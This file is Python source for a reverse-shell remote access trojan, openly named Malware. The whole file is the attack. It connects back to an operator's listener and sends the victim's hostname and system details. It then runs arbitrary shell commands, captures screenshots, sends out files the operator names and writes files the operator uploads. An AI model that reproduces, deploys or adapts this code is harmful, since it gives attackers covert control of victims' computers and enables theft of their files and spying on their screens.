import socket
import os 
import subprocess 
import requests 
import time
import platform
import pyautogui
import uuid 
class Malware():
    def __init__(self , lhost , lport , timer):
        self.i = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        self.lhost = lhost
        self.lport = lport
        self.timer = timer
        self.hostname = socket.gethostname()
        self.username = os.getlogin()
        self.info = f"""
-----------------
      INFO
-----------------
hostname => {self.hostname}
username => {self.username}
os => {platform.system()}
release => {platform.release()}
version => {platform.version()}
Arch => {platform.architecture()[0]}
python version => {platform.python_version()}
"""
    def connect_server(self):
        while True:
            try:
                self.i.connect((self.lhost, self.lport))
                self.interact_server()
            except:
                time.sleep(self.timer)
    def interact_server(self):
        self.i.sendall(self.hostname.encode())
        while True:
            command = self.i.recv(1024).decode()
            if command == 'info':
                self.i.sendall(self.info.encode())
            elif command == 'shell':
                while True:
                    command = self.i.recv(1024).decode()
                    if command.lower() == 'exit':
                        break
                    elif command.startswith('cd'):
                        try:
                            data = command.split()
                            dirw = data[1]
                            os.chdir(dirw)
                            self.i.sendall('<end>'.encode())
                        except:
                            output = subprocess.getoutput(command)
                            self.i.sendall(output.encode())
                            self.i.sendall('<end>'.encode())
                    else:
                        output = subprocess.getoutput(command)
                        if len(output) > 0 and output != None:
                            self.i.sendall(output.encode())
                            self.i.sendall('<end>'.encode())
                        else:
                            self.i.sendall('<end>'.encode())
            elif command == 'screenshot':
                uid = uuid.uuid4()
                screenshot = pyautogui.screenshot()
                screenshot.save(f'{uid}.jpg')
                with open(f'{uid}.jpg' , 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if len(data) > 0:
                            self.i.sendall(data)
                        else:
                            self.i.sendall('<end>'.encode())
                            break
                    os.remove(f'{uid}.jpg')
                    file.close()
            elif command.startswith('download'):
                try:
                    data = command.split()
                    filename = data[1]
                    with open(filename , 'rb') as file:
                        self.i.sendall('work'.encode())
                        time.sleep(0.7)
                        while True:
                            data = file.read(1024)
                            if len(data) > 0:
                                self.i.sendall(data)
                            else:
                                self.i.sendall("<end>".encode())
                                break
                except FileNotFoundError:
                    self.i.sendall('error:file_not_found'.encode())
                except PermissionError:
                    self.i.sendall('error:admin'.encode())     
            elif command.startswith('upload'):
                try:
                    data = command.split()
                    filename = data[1]
                    with open(filename , 'wb') as file:
                        self.i.sendall('work'.encode())
                        while True:
                            data = self.i.recv(1024)
                            print(data.decode())
                            if data[-5:] == b'<end>' or data == b'<end>':
                                if data[-5:] == b'<end>':
                                    file.write(data[:-5])
                                    break
                                else:
                                    break
                            else:
                                file.write(data)
                    file.close()
                except PermissionError:
                    self.i.sendall('error:admin'.encode())
                    
                
Malware('localhost',4444,0).connect_server()